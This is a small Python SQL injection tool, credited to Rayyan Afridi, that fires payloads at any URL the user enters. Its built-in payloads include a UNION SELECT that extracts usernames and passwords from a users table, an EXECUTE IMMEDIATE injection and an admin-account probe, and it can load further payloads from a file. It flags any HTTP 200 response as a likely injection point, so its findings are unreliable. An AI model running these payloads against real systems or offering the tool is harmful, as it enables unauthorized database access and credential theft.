import requests

# Default payloads
basic_payloads = ["' OR '1'='1"]
extended_payloads = [
    "' OR '1'='1", 
    "'; EXECUTE IMMEDIATE 'SELECT USER'; --",
    "' OR '1'='1' UNION SELECT null, username || ':' || password FROM users --",
    "' AND EXISTS(SELECT * FROM users WHERE username = 'admin' AND password LIKE '%') --"
]

def load_payloads_from_file(file_path):
    try:
        with open(file_path, 'r') as file:
            return [line.strip() for line in file if line.strip()]
    except FileNotFoundError:
        print(f"\033[91mError: The file {file_path} was not found.\033[0m")
        return None

def scan_sql_injection(base_url, payloads):
    if not payloads:
        print("\033[93mNo payloads to test.\033[0m")
        return

    if "=" not in base_url:
        print("\033[93mExample URL format: https://example.com/param=1\033[0m")
        return

    for payload in payloads:
        test_url = base_url + payload
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f"\033[92mPotential SQL Injection point found at: {test_url}\033[0m")
            else:
                print(f"\033[96mNo vulnerability detected with payload: {payload}\033[0m")
        except requests.exceptions.RequestException as e:
            print(f"\033[91mFailed to make a request: {e}\033[0m")

# Display creator credit
print("\033[1;94mCreated by Rayyan Afridi\033[0m")  # Bold and blue text
print("\033[1;95mIt's an SQL Injector\033[0m")  # Bold and magenta text

# Select payload source
choice = input("Use (1) predefined payloads, (2) custom payload file, or (3) exit: ")
if choice == '1':
    url = input("Enter the base URL to test (include parameter and equal sign, e.g., https://example.com/param=): ")
    option = input("Use extended payloads? (yes/no): ").lower() == "yes"
    payloads = extended_payloads if option else basic_payloads
    scan_sql_injection(url, payloads)
elif choice == '2':
    file_path = input("Enter the path to your payload file: ")
    payloads = load_payloads_from_file(file_path)
    if payloads:
        url = input("Enter the base URL to test (include parameter and equal sign, e.g., https://example.com/param=): ")
        scan_sql_injection(url, payloads)
else:
    print("\033[1;93mExiting the program. Goodbye!\033[0m")
